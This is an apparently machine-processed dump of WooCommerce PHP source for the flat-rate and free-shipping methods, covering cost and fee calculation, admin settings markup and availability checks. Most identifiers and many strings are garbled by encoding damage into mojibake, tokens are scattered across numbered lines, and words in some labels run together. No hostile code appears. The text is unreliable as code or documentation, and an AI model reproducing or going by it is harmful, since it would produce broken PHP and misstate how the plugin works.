( 'Per Order - charge shipping forheƒntire order‡s‡ whole', 'woocommerce' ),

144 '™em' => 
	`__
( 'Per Item - charge shipping forƒach item individually', 'woocommerce' ),

145 'şass' => 
	`__
( 'Per Class - charge shipping forƒach shipping class in‡n order', 'woocommerce' ),

148 'add™iÚ®_co¡s_bË' => 
	`¬¿y
(

151 'mšimum_ãe' => 
	`¬¿y
(

152 't™Ë' => 
	`__
( 'Minimum Handling Fee', 'woocommerce' ),

154 '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_´iû
( 0 ),

155 'desütiÚ' => 
	`__
( 'Enter‡ minimum fee‡mount. Fee\'s†esshanhis will be increased. Leave blanko disable.', 'woocommerce' ),

157 'desc_t' => 
Œue


161 
	}
}

171 
funùiÚ
 
ÿlcuÏ‹_shpšg
Ğ
$·ckage
 = 
	$¬¿y
() ) {

173 
$this
->
¿‹s
 = 
	`¬¿y
();

174 
$co¡_³r_Üd”
 = ( 
	`is£t
Ğ
$this
->
co¡_³r_Üd”
 ) && ! 
	`em±y
( $this->cost_per_order ) ) ? $this->cost_per_order : 0;

176 iàĞ
$this
->
ty³
 == 'order' ) {

178 
$shpšg_tÙ®
 = 
$this
->
	`Üd”_shpšg
Ğ
$·ckage
 );

180 iàĞ! 
	`is_nuÎ
Ğ
$shpšg_tÙ®
 ) || 
$co¡_³r_Üd”
 > 0 ) {

181 
$¿‹
 = 
	`¬¿y
(

182 'id' => 
$this
->
id
,

183 'Ïb–' => 
$this
->
t™Ë
,

184 'co¡' => 
$shpšg_tÙ®
 + 
$co¡_³r_Üd”
,

188 } 
	`–£if
 ( 
$this
->
ty³
 == 'class' ) {

190 
$shpšg_tÙ®
 = 
$this
->
	`şass_shpšg
Ğ
$·ckage
 );

192 iàĞ! 
	`is_nuÎ
Ğ
$shpšg_tÙ®
 ) || 
$co¡_³r_Üd”
 > 0 ) {

193 
$¿‹
 = 
	`¬¿y
(

194 'id' => 
$this
->
id
,

195 'Ïb–' => 
$this
->
t™Ë
,

196 'co¡' => 
$shpšg_tÙ®
 + 
$co¡_³r_Üd”
,

200 } 
	`–£if
 ( 
$this
->
ty³
 == 'item' ) {

202 
$co¡s
 = 
$this
->
	`™em_shpšg
Ğ
$·ckage
 );

204 iàĞ! 
	`is_nuÎ
Ğ
$co¡s
 ) || 
$co¡_³r_Üd”
 > 0 ) {

206 iàĞ! 
	`is_¬¿y
Ğ
$co¡s
 ) ) {

207 
$co¡s
 = 
	`¬¿y
();

210 
$co¡s
['Üd”'] = 
$co¡_³r_Üd”
;

212 
$¿‹
 = 
	`¬¿y
(

213 'id' => 
$this
->
id
,

214 'Ïb–' => 
$this
->
t™Ë
,

215 'co¡' => 
$co¡s
,

222 iàĞ
	`is£t
Ğ
$¿‹
 ) ) {

223 
$this
->
	`add_¿‹
Ğ
$¿‹
 );

227 iàĞĞ
$this
->
İtiÚs
 ) > 0) {

229 iàĞ! 
	`is£t
Ğ
$¿‹
 ) ) {

230 
$¿‹
 = 
	`¬¿y
(

231 'id' => 
$this
->
id
,

232 'Ïb–' => 
$this
->
t™Ë
,

238 
$tÙ®_quªt™y
 = 0;

240 
	`fÜ—ch
 ( 
$·ckage
['cÚ‹Ás'] 
as
 
$™em_id
 => 
$v®ues
 ) {

241 iàĞ
$v®ues
['quªt™y'] > 0 && $v®ues['d©a']->
	`Ãeds_shpšg
() ) {

242 
$tÙ®_quªt™y
 +ğ
$v®ues
['quantity'];

247 
	`fÜ—ch
 ( 
$this
->
İtiÚs
 
as
 
$İtiÚ
 ) {

249 
$this_İtiÚ
 = 
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$İtiÚ
 ) );

251 iàĞĞ
$this_İtiÚ
 ) !== 3 ) ;

253 
$exŒa_¿‹
 = 
$¿‹
;

255 
$exŒa_¿‹
['id'] = 
$this
->
id
 . ':' . 
$this_İtiÚ
[0];

256 
$exŒa_¿‹
['Ïb–'] = 
$this_İtiÚ
[0];

257 
$this_co¡
 = 
$this_İtiÚ
[1];

258 
$this_co¡_³rûÁs
 = '';

260 
$·‰”n
 =

268 iàĞ
	`´eg_m©ch
Ğ
$·‰”n
, 
$this_co¡
, 
$this_co¡_m©ches
 ) ) {

269 
$this_co¡_m©hİ
 = 
$this_co¡_m©ches
[2];

270 
$this_co¡_³rûÁs
 = 
$this_co¡_m©ches
[3] / 100;

271 
$this_co¡
 = 
$this_co¡_m©ches
[1];

272 
	`un£t
Ğ
$this_co¡_m©ches
 );

276 iàĞ
$this_İtiÚ
[2] == 'yes' ) {

277 
$this_ty³
 = 'order';

278 } 
	`–£if
 ( 
$this_İtiÚ
[2] == 'no' ) {

279 
$this_ty³
 = 
$this
->
ty³
;

281 
$this_ty³
 = 
$this_İtiÚ
[2];

284  
$this_ty³
 ) {

286 
$this_co¡
 = $this_co¡ * Ğ
$this
->
	`fšd_shpšg_şas£s
Ğ
$·ckage
 ) );

289 iàĞ
$this_co¡_³rûÁs
 ) {

290 
	`fÜ—ch
 ( 
$this
->
	`fšd_shpšg_şas£s
Ğ
$·ckage
 ) 
as
 
$shpšg_şass
 => 
$™ems
 ){

291 
	`fÜ—ch
 ( 
$™ems
 
as
 
$™em_id
 => 
$v®ues
 ) {

292 ià(
$this_co¡_m©hİ
 == '+') {

293 
$this_co¡
 +ğ
$this_co¡_³rûÁs
 * 
$v®ues
['line_total'];

296 
$this_co¡
 -ğ
$this_co¡_³rûÁs
 * 
$v®ues
['line_total'];

303 
$this_co¡
 = $this_co¡ * 
$tÙ®_quªt™y
;

306 iàĞ
$this_co¡_³rûÁs
 ) {

307 
	`fÜ—ch
 ( 
$·ckage
['cÚ‹Ás'] 
as
 
$™em_id
 => 
$v®ues
 ) {

308 ià(
$this_co¡_m©hİ
 == '+') {

309 
$this_co¡
 +ğ
$this_co¡_³rûÁs
 * 
$v®ues
['line_total'];

311 
$this_co¡
 -ğ
$this_co¡_³rûÁs
 * 
$v®ues
['line_total'];

318 iàĞ
$this_co¡_³rûÁs
 ) {

319 ià(
$this_co¡_m©hİ
 == '+') {

320 
$this_co¡
 +ğ
$this_co¡_³rûÁs
 * 
$·ckage
['contents_cost'];

322 
$this_co¡
 -ğ
$this_co¡_³rûÁs
 * 
$·ckage
['contents_cost'];

329 iàĞ
	`is_¬¿y
Ğ
$exŒa_¿‹
['co¡'] ) ) $exŒa_¿‹['co¡']['Üd”'] = $exŒa_¿‹['co¡']['Üd”'] + 
$this_co¡
;

332 
$exŒa_¿‹
['co¡'] = $exŒa_¿‹['co¡'] + 
$this_co¡
;

334 
$this
->
	`add_¿‹
Ğ
$exŒa_¿‹
 );

337 
	}
}

347 
funùiÚ
 
	$Üd”_shpšg
Ğ
$·ckage
 ) {

348 
$co¡
 = 
nuÎ
;

349 
$ãe
 = 
nuÎ
;

351 iàĞĞ
$this
->
æ©_¿‹s
 ) > 0 ) {

353 
$found_shpšg_şas£s
 = 
$this
->
	`fšd_shpšg_şas£s
Ğ
$·ckage
 );

356 
	`fÜ—ch
 ( 
$found_shpšg_şas£s
 
as
 
$shpšg_şass
 => 
$´oduùs
 ) {

357 iàĞ
	`is£t
Ğ
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ] ) ) {

358 iàĞ
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ]['co¡'] > 
$co¡
 ) {

359 
$co¡
 = 
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ]['cost'];

360 
$ãe
 = 
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ]['fee'];

364 iàĞ! 
	`em±y
Ğ
$this
->
co¡
 ) && $this->co¡ > 
$co¡
 ) {

365 
$co¡
 = 
$this
->
co¡
;

366 
$ãe
 = 
$this
->
ãe
;

374 iàĞ
	`is_nuÎ
Ğ
$co¡
 ) && 
$this
->
co¡
 !== '' ) {

375 
$co¡
 = 
$this
->
co¡
;

376 
$ãe
 = 
$this
->
ãe
;

377 } 
	`–£if
 ( 
	`is_nuÎ
Ğ
$co¡
 ) ) {

379 
$co¡
 = 0;

380 
$ãe
 = 0;

384  
$co¡
 + 
$this
->
	`g‘_ãe
Ğ
$ãe
, 
$·ckage
['contents_cost'] );

385 
	}
}

395 
funùiÚ
 
	$şass_shpšg
Ğ
$·ckage
 ) {

396 
$co¡
 = 
nuÎ
;

397 
$ãe
 = 
nuÎ
;

398 
$m©ched
 = 
çl£
;

400 iàĞĞ
$this
->
æ©_¿‹s
 ) > 0 || $this->
co¡
 !== '' ) {

403 
$found_shpšg_şas£s
 = 
$this
->
	`fšd_shpšg_şas£s
Ğ
$·ckage
 );

406 
$found_shpšg_şas£s_v®ues
 = 
	`¬¿y
();

408 
	`fÜ—ch
 ( 
$found_shpšg_şas£s
 
as
 
$shpšg_şass
 => 
$´oduùs
 ) {

409 iàĞ! 
	`is£t
Ğ
$found_shpšg_şas£s_v®ues
[ 
$shpšg_şass
 ] ) ) {

410 
$found_shpšg_şas£s_v®ues
[ 
$shpšg_şass
 ] = 0;

413 
	`fÜ—ch
 ( 
$´oduùs
 
as
 
$´oduù
 ) {

414 
$found_shpšg_şas£s_v®ues
[ 
$shpšg_şass
 ] +ğ
$´oduù
['d©a']->
	`g‘_´iû
() * $product['quantity'];

419 
	`fÜ—ch
 ( 
$found_shpšg_şas£s_v®ues
 
as
 
$shpšg_şass
 => 
$şass_´iû
 ) {

420 iàĞ
	`is£t
Ğ
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ] ) ) {

421 
$co¡
 +ğ
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ]['cost'];

422 
$ãe
 +ğ
$this
->
	`g‘_ãe
Ğ$this->
æ©_¿‹s
[ 
$shpšg_şass
 ]['ãe'], 
$şass_´iû
 );

423 
$m©ched
 = 
Œue
;

424 } 
	`–£if
 ( 
$this
->
co¡
 !== '' ) {

426 
$co¡
 +ğ
$this
->
co¡
;

427 
$ãe
 +ğ
$this
->
	`g‘_ãe
Ğ$this->
ãe
, 
$şass_´iû
 );

428 
$m©ched
 = 
Œue
;

434 iàĞ
$m©ched
 ) {

435  
$co¡
 + 
$ãe
;

437  
nuÎ
;

439 
	}
}

449 
funùiÚ
 
	$™em_shpšg
Ğ
$·ckage
 ) {

451 
$co¡s
 = 
	`¬¿y
();

453 
$m©ched
 = 
çl£
;

456 
	`fÜ—ch
 ( 
$·ckage
['cÚ‹Ás'] 
as
 
$™em_id
 => 
$v®ues
 ) {

457 
$_´oduù
 = 
$v®ues
['data'];

459 iàĞ
$v®ues
['quªt™y'] > 0 && 
$_´oduù
->
	`Ãeds_shpšg
() ) {

460 
$shpšg_şass
 = 
$_´oduù
->
	`g‘_shpšg_şass
();

462 
$ãe
 = 
$co¡
 = 0;

464 iàĞ
	`is£t
Ğ
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ] ) ) {

465 
$co¡
 = 
$this
->
æ©_¿‹s
[ 
$shpšg_şass
 ]['cost'];

466 
$ãe
 = 
$this
->
	`g‘_ãe
Ğ$this->
æ©_¿‹s
[ 
$shpšg_şass
 ]['ãe'], 
$_´oduù
->
	`g‘_´iû
() );

467 
$m©ched
 = 
Œue
;

468 } 
	`–£if
 ( 
$this
->
co¡
 !== '' ) {

469 
$co¡
 = 
$this
->
co¡
;

470 
$ãe
 = 
$this
->
	`g‘_ãe
Ğ$this->
ãe
, 
$_´oduù
->
	`g‘_´iû
() );

471 
$m©ched
 = 
Œue
;

474 
$co¡s
[ 
$™em_id
 ] = ( ( 
$co¡
 + 
$ãe
 ) * 
$v®ues
['quantity'] );

478 iàĞ
$m©ched
 ) {

479  
$co¡s
;

481  
nuÎ
;

483 
	}
}

492 
public
 
funùiÚ
 
	$fšd_shpšg_şas£s
Ğ
$·ckage
 ) {

493 
$found_shpšg_şas£s
 = 
	`¬¿y
();

496 iàĞĞ
$·ckage
['contents'] ) > 0 ) {

497 
	`fÜ—ch
 ( 
$·ckage
['cÚ‹Ás'] 
as
 
$™em_id
 => 
$v®ues
 ) {

498 iàĞ
$v®ues
['d©a']->
	`Ãeds_shpšg
() ) {

499 
$found_şass
 = 
$v®ues
['d©a']->
	`g‘_shpšg_şass
();

500 iàĞ! 
	`is£t
Ğ
$found_shpšg_şas£s
[ 
$found_şass
 ] ) ) {

501 
$found_shpšg_şas£s
[ 
$found_şass
 ] = 
	`¬¿y
();

504 
$found_shpšg_şas£s
[ 
$found_şass
 ][ 
$™em_id
 ] = 
$v®ues
;

509  
$found_shpšg_şas£s
;

510 
	}
}

519 
funùiÚ
 
	$v®id©e_add™iÚ®_co¡s_bË_f›ld
Ğ
$key
 ) {

520  
çl£
;

521 
	}
}

529 
funùiÚ
 
	$g’”©e_add™iÚ®_co¡s_bË_html
() {

530 
	`ob_¡¬t
();

532 <
Œ
 
v®ign
="top">

533 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
	`_e
( 'Costs', 'woocommerce' ); ?>:</th>

534 <
td
 
şass
="fÜmšp" 
id
="<?phpƒcho $this->id; ?>_flat_rates">

535 <
bË
 
şass
="shpšgrow wideçt" 
ûÎ¥acšg
="0">

536 <
th—d
>

537 <
Œ
>

538 <
th
 
şass
="check-cŞumn"><
šput
 
ty³
="checkbox"></th>

539 <
th
 
şass
="shpšg_şass"><?
php
 
	`_e
( 'Shipping Class', 'woocommerce' ); ?></th>

540 <
th
><?
php
 
	`_e
Ğ'Co¡', 'woocomm”û' ); ?> <
a
 
şass
="ts" 
d©a
-
t
="<?php _e( 'Cost,ƒxcludingax.', 'woocommerce' ); ?>">[?]</a></th>

541 <
th
><?
php
 
	`_e
Ğ'Hªdlšg F“', 'woocomm”û' ); ?> <
a
 
şass
="ts" 
d©a
-
t
="<?php _e( 'Feeƒxcludingax. Enter‡n‡mount,ƒ.g. 2.50, or‡…ercentage,ƒ.g. 5%.', 'woocommerce' ); ?>">[?]</a></th>

542 </
Œ
>

543 </
th—d
>

544 <
tfoÙ
>

545 <
Œ
>

546 <
th
 
cŞ¥ª
="4"><
a
 
h»f
="#" 
şass
="add bu‰Ú"><?
php
 
	`_e
( 'Add Cost', 'woocommerce' ); ?></a> <a href="#" class="remove button"><?php _e( 'Delete selected costs', 'woocommerce' ); ?></a></th>

547 </
Œ
>

548 </
tfoÙ
>

549 <
tbody
 
şass
="flat_rates">

550 <
Œ
>

551 <
td
></td>

552 <
td
 
şass
="æ©_¿‹_şass"><?
php
 
	`_e
( 'Any class', 'woocommerce' ); ?></td>

553 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞwc_fÜm©_loÿlized_´iûĞ$this->co¡ ) ); ?>" 
Çme
="deçuÉ_co¡" 
¶aûhŞd”
="<?ph°_eĞ'N/A', 'woocomm”û' ); ?>" 
size
="4" 
şass
="wc_input_price" /></td>

554 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞwc_fÜm©_loÿlized_´iûĞ$this->ãè); ?>" 
Çme
="deçuÉ_ãe" 
¶aûhŞd”
="<?ph°_eĞ'N/A', 'woocomm”û' ); ?>" 
size
="4" 
şass
="wc_input_price" /></td>

555 </
Œ
>

556 <?
php


557 
$i
 = -1;

558 iàĞ
$this
->
æ©_¿‹s
 ) {

559 
	`fÜ—ch
 ( 
$this
->
æ©_¿‹s
 
as
 
$şass
 => 
$¿‹
 ) {

560 
$i
++;

562 
echo
 '<tr class="flat_rate">

563 <
th
 
şass
="check-cŞumn"><
šput
 
ty³
="checkbox" 
Çme
="select" /></th>

564 <
td
 
şass
="flat_rate_class">

565 <
£Ëù
 
Çme
="' .ƒsc_©ŒĞ$this->id . '_şass[' . $˜. ']' ) . '" 
şass
="select">';

567 iàĞ
	`WC
()->
shpšg
->
	`g‘_shpšg_şas£s
() ) {

568 
	`fÜ—ch
 ( 
	`WC
()->
shpšg
->
	`g‘_shpšg_şas£s
(è
as
 
$shpšg_şass
 ) {

569 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$shpšg_şass
->
¦ug
 ) . '" '.
	`£Ëùed
($shpšg_şass->¦ug, 
$şass
, 
çl£
).'>'.$shpšg_şass->
Çme
.'</option>';

572 
echo
 '<İtiÚ v®ue="">'.
	`__
( 'Select‡ class&hellip;', 'woocommerce' ).'</option>';

575 
echo
 '</select>

576 </
td
>

577 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$¿‹['co¡'] ) . '" 
Çme
="' .ƒsc_©ŒĞ$this->id .'_co¡[' . $˜. ']' ) . '" 
¶aûhŞd”
="' . wc_fÜm©_loÿlized_´iûĞ0 ) . '" 
size
="4" 
şass
="wc_input_price" /></td>

578 <
td
><
šput
 
ty³
="‹xt" 
v®ue
="' .ƒsc_©ŒĞ$¿‹['ãe'] ) . '" 
Çme
="' .ƒsc_©ŒĞ$this->id .'_ãe[' . $˜. ']' ) . '" 
¶aûhŞd”
="' . wc_fÜm©_loÿlized_´iûĞ0 ) . '" 
size
="4" 
şass
="wc_input_price" /></td>

579 </
Œ
>';

583 </
tbody
>

584 </
bË
>

585 <
süt
 
ty³
="text/javascript">

586 
	`jQu”y
(
	`funùiÚ
() {

588 
	`jQu”y
('#<?ph°echØ$this->id; ?>_æ©_¿‹s').
	`Ú
Ğ'şick', 'a.add', 
	`funùiÚ
(){

590 
v¬
 
size
 = 
	`jQu”y
('#<?ph°echØ$this->id; ?>_æ©_¿‹ tbody .æ©_¿‹').
	`size
();

592 
	`jQu”y
('<Œ cÏss="æ©_¿‹">\
<th cÏss="check-cŞumn"><špuˆty³="checkbox"‚ame="£Ëù" /></th>\
<td cÏss="æ©_¿‹_şass">\
<£Ëù‚ame="<?ph°echØ$this->id; ?>_şass[' + 
size
 + ']" class="select">\
<?php

597 ià(
	`WC
()->
shpšg
->
	`g‘_shpšg_şas£s
()) :

598 
	`fÜ—ch
 (
	`WC
()->
shpšg
->
	`g‘_shpšg_şas£s
(è
as
 
$şass
) :

599 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$şass
->
¦ug
 ) . '">' . 
	`esc_js
Ğ$şass->
Çme
 ) . '</option>';

600 
’dfÜ—ch
;

602 
echo
 '<İtiÚ v®ue="">'.
	`__
( 'Select‡ class&hellip;', 'woocommerce' ).'</option>';

603 
’dif
;

605 </
£Ëù
>\

606 </
td
>\

607 <
td
><
šput
 
ty³
="‹xt" 
Çme
="<?ph°echØ$this->id; ?>_co¡[' + siz+ ']" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
size
="4" 
şass
="wc_input_price" /></td>\

608 <
td
><
šput
 
ty³
="‹xt" 
Çme
="<?ph°echØ$this->id; ?>_ãe[' + siz+ ']" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
size
="4" 
şass
="wc_input_price" /></td>\

609 </
Œ
>').­³ndTo('#<?
php
 
echo
 
$this
->
id
; ?>
_æ©_¿‹s
 
bË
 
tbody
');

611  
çl£
;

615 
	`jQu”y
('#<?ph°echØ$this->id; ?>_æ©_¿‹s').
	`Ú
Ğ'şick', 'a.»move', 
	`funùiÚ
(){

616 
v¬
 
ªsw”
 = 
	`cÚfœm
("<?php _e( 'Deletehe selected„ates?', 'woocommerce' ); ?>");

617 ià(
ªsw”
) {

618 
	`jQu”y
('#<?ph°echØ$this->id; ?>_æ©_¿‹ bËbody¸th.check-cŞumÀšput:checked').
	`—ch
(
	`funùiÚ
(
i
, 
–
){

619 
	`jQu”y
(
–
).
	`şo£¡
('Œ').
	`»move
();

622  
çl£
;

626 </
süt
>

627 </
td
>

628 </
Œ
>

629 <?
php


630  
	`ob_g‘_ş—n
();

631 
	}
}

639 
funùiÚ
 
	$´oûss_æ©_¿‹s
() {

641 
$æ©_¿‹_şass
 = 
	`¬¿y
();

642 
$æ©_¿‹_co¡
 = 
	`¬¿y
();

643 
$æ©_¿‹_ãe
 = 
	`¬¿y
();

644 
$æ©_¿‹s
 = 
	`¬¿y
();

646 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
id
 . '_şass'] ) ) 
$æ©_¿‹_şass
 = 
	`¬¿y_m­
( 'wc_clean', $_POST[ $this->id . '_class'] );

647 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
id
 . '_co¡'] ) ) 
$æ©_¿‹_co¡
 = 
	`¬¿y_m­
( 'stripslashes', $_POST[ $this->id . '_cost'] );

648 iàĞ
	`is£t
Ğ
$_POST
[ 
$this
->
id
 . '_ãe'] ) ) 
$æ©_¿‹_ãe
 = 
	`¬¿y_m­
( 'stripslashes', $_POST[ $this->id . '_fee'] );

651 
$v®ues
 = 
$æ©_¿‹_şass
;

652 
	`ksÜt
Ğ
$v®ues
 );

653 
$v®ue
 = 
	`’d
Ğ
$v®ues
 );

654 
$key
 = 
	`key
Ğ
$v®ues
 );

656  
$i
 = 0; $˜<ğ
$key
; $i++ ) {

657 iàĞ! 
	`em±y
Ğ
$æ©_¿‹_şass
[ 
$i
 ] ) && 
	`is£t
Ğ
$æ©_¿‹_co¡
[ $˜] ) && is£tĞ
$æ©_¿‹_ãe
[ $i ] ) ) {

659 
$æ©_¿‹_co¡
[ 
$i
 ] = 
	`wc_fÜm©_decim®
( $flat_rate_cost[$i] );

661 iàĞ! 
	`¡r¡r
Ğ
$æ©_¿‹_ãe
[
$i
], '%' ) ) {

662 
$æ©_¿‹_ãe
[ 
$i
 ] = 
	`wc_fÜm©_decim®
( $flat_rate_fee[$i] );

664 
$æ©_¿‹_ãe
[ 
$i
 ] = 
	`wc_ş—n
( $flat_rate_fee[$i] );

668 
$æ©_¿‹s
[ 
$æ©_¿‹_şass
[ 
$i
 ] ] = 
	`¬¿y
(

669 'co¡' => 
$æ©_¿‹_co¡
[ 
$i
 ],

670 'ãe' => 
$æ©_¿‹_ãe
[ 
$i
 ],

675 
	`upd©e_İtiÚ
Ğ
$this
->
æ©_¿‹_İtiÚ
, 
$æ©_¿‹s
 );

677 
$this
->
	`g‘_æ©_¿‹s
();

678 
	}
}

687 
funùiÚ
 
	$§ve_deçuÉ_co¡s
Ğ
$f›lds
 ) {

688 
$deçuÉ_co¡
 = ( 
$_POST
['deçuÉ_co¡'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['default_cost'] );

690 iàĞ! 
	`¡r¡r
Ğ
$_POST
['default_fee'], '%' ) ) {

691 
$deçuÉ_ãe
 = ( 
$_POST
['deçuÉ_ãe'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['default_fee'] );

693 
$deçuÉ_ãe
 = 
	`wc_ş—n
Ğ
$_POST
['default_fee'] );

696 
$f›lds
['co¡'] = 
$deçuÉ_co¡
;

697 
$f›lds
['ãe'] = 
$deçuÉ_ãe
;

699  
$f›lds
;

700 
	}
}

709 
funùiÚ
 
	$g‘_æ©_¿‹s
() {

710 
$this
->
æ©_¿‹s
 = 
	`¬¿y_f‹r
Ğ(
¬¿y
è
	`g‘_İtiÚ
Ğ$this->
æ©_¿‹_İtiÚ
 ) );

711 
	}
}

	@includes/shipping/free-shipping/class-wc-shipping-free-shipping.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_Shpšg_F»e_Shpšg
 
ex‹nds
 
	mWC_Shpšg_M‘hod
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'free_shipping';

25 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Free Shipping', 'woocommerce' );

26 
$this
->
	`š™
();

35 
funùiÚ
 
	$š™
() {

38 
$this
->
	`š™_fÜm_f›lds
();

39 
$this
->
	`š™_£‰šgs
();

42 
$this
->
’abËd
 = $this->
	`g‘_İtiÚ
( 'enabled' );

43 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

44 
$this
->
mš_amouÁ
 = $this->
	`g‘_İtiÚ
( 'min_amount', 0 );

45 
$this
->
avaab™y
 = $this->
	`g‘_İtiÚ
( 'availability' );

46 
$this
->
couÁr›s
 = $this->
	`g‘_İtiÚ
( 'countries' );

47 
$this
->
»quœes
 = $this->
	`g‘_İtiÚ
( 'requires' );

50 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

51 
	}
}

60 
funùiÚ
 
	$š™_fÜm_f›lds
() {

62 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

63 '’abËd' => 
	`¬¿y
(

64 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

66 'Ïb–' => 
	`__
( 'Enable Free Shipping', 'woocommerce' ),

69 't™Ë' => 
	`¬¿y
(

70 't™Ë' => 
	`__
( 'Method Title', 'woocommerce' ),

72 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

73 'deçuÉ' => 
	`__
( 'Free Shipping', 'woocommerce' ),

74 'desc_t' => 
Œue
,

76 'avaab™y' => 
	`¬¿y
(

77 't™Ë' => 
	`__
( 'Method‡vailability', 'woocommerce' ),

81 'İtiÚs' => 
	`¬¿y
(

82 '®l' => 
	`__
( 'All‡llowed countries', 'woocommerce' ),

83 '¥ecific' => 
	`__
( 'Specific Countries', 'woocommerce' )

86 'couÁr›s' => 
	`¬¿y
(

87 't™Ë' => 
	`__
( 'Specific Countries', 'woocommerce' ),

92 'İtiÚs' => 
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
(),

93 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

94 'd©a-¶aûhŞd”' => 
	`__
( 'Select some countries', 'woocommerce' )

97 '»quœes' => 
	`¬¿y
(

98 't™Ë' => 
	`__
( 'Free Shipping Requires...', 'woocommerce' ),

101 'İtiÚs' => 
	`¬¿y
(

102 '' => 
	`__
( 'N/A', 'woocommerce' ),

103 'coupÚ' => 
	`__
( 'A valid free shipping coupon', 'woocommerce' ),

104 'mš_amouÁ' => 
	`__
( 'A minimum order‡mount (defined below)', 'woocommerce' ),

105 'e™h”' => 
	`__
( 'A minimum order‡mount OR‡ coupon', 'woocommerce' ),

106 'bÙh' => 
	`__
( 'A minimum order‡mount AND‡ coupon', 'woocommerce' ),

109 'mš_amouÁ' => 
	`¬¿y
(

110 't™Ë' => 
	`__
( 'Minimum Order Amount', 'woocommerce' ),

112 '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_´iû
( 0 ),

113 'desütiÚ' => 
	`__
( 'Users will‚eedo spendhis‡mounto get free shipping (ifƒnabled‡bove).', 'woocommerce' ),

115 'desc_t' => 
Œue


119 
	}
}

130 
public
 
funùiÚ
 
	$admš_İtiÚs
() {

133 <
h3
><?
php
 
	`_e
( 'Free Shipping', 'woocommerce' ); ?></h3>

134 <
bË
 
şass
="form-table">

135 <?
php


137 
$this
->
	`g’”©e_£‰šgs_html
();

139 </
bË
><!--/.
fÜm
-table-->

140 <?
php


141 
	}
}

151 
funùiÚ
 
	$is_avaabË
Ğ
$·ckage
 ) {

153 iàĞ
$this
->
’abËd
 =ğ"no" )  
çl£
;

155 
$sh_to_couÁr›s
 = '';

157 iàĞ
$this
->
avaab™y
 == 'specific' )

158 
$sh_to_couÁr›s
 = 
$this
->
couÁr›s
;

160 
$sh_to_couÁr›s
 = 
	`¬¿y_keys
Ğ
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
() );

162 iàĞ
	`is_¬¿y
Ğ
$sh_to_couÁr›s
 ) )

163 iàĞ! 
	`š_¬¿y
Ğ
$·ckage
['de¡š©iÚ']['couÁry'], 
$sh_to_couÁr›s
 ) )

164  
çl£
;

167 
$is_avaabË
 = 
çl£
;

168 
$has_coupÚ
 = 
çl£
;

169 
$has_m‘_mš_amouÁ
 = 
çl£
;

171 iàĞ
	`š_¬¿y
Ğ
$this
->
»quœes
, 
	`¬¿y
( 'coupon', 'either', 'both' ) ) ) {

173 iàĞ
$coupÚs
 = 
	`WC
()->
ÿ¹
->
	`g‘_coupÚs
() ) {

174 
	`fÜ—ch
 ( 
$coupÚs
 
as
 
$code
 => 
$coupÚ
 ) {

175 iàĞ
$coupÚ
->
	`is_v®id
(è&& $coupÚ->
	`’abË_ä“_shpšg
() )

176 
$has_coupÚ
 = 
Œue
;

181 iàĞ
	`š_¬¿y
Ğ
$this
->
»quœes
, 
	`¬¿y
Ğ'mš_amouÁ', 'e™h”', 'bÙh' ) ) && 
	`is£t
Ğ
	`WC
()->
ÿ¹
->
ÿ¹_cÚ‹Ás_tÙ®
 ) ) {

183 iàĞ
	`WC
()->
ÿ¹
->
´iûs_šşude_x
 )

184 
$tÙ®
 = 
	`WC
()->
ÿ¹
->
ÿ¹_cÚ‹Ás_tÙ®
 + 
	`¬¿y_sum
ĞWC()->ÿ¹->
xes
 );

186 
$tÙ®
 = 
	`WC
()->
ÿ¹
->
ÿ¹_cÚ‹Ás_tÙ®
;

188 iàĞ
$tÙ®
 >ğ
$this
->
mš_amouÁ
 )

189 
$has_m‘_mš_amouÁ
 = 
Œue
;

192  
$this
->
»quœes
 ) {

194 iàĞ
$has_m‘_mš_amouÁ
 ) 
$is_avaabË
 = 
Œue
;

197 iàĞ
$has_coupÚ
 ) 
$is_avaabË
 = 
Œue
;

200 iàĞ
$has_m‘_mš_amouÁ
 && 
$has_coupÚ
 ) 
$is_avaabË
 = 
Œue
;

203 iàĞ
$has_m‘_mš_amouÁ
 || 
$has_coupÚ
 ) 
$is_avaabË
 = 
Œue
;

206 
$is_avaabË
 = 
Œue
;

210  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_' . 
$this
->
id
 . '_is_avaabË', 
$is_avaabË
 );

